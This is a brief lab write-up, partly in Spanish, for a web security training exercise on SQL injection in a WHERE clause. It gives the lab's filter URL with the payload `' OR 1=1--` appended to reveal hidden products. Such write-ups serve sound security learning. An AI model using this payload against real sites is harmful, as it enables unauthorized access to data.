# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

Cuando filtramos por categoría aparece tenemos la siguiente url:

url: https://0a7e00d603ff3b4180cb5333008b0081.web-security-academy.net/filter?category=Gifts

injection: https://0a7e00d603ff3b4180cb5333008b0081.web-security-academy.net/filter?category=Gifts `' OR 1=1--`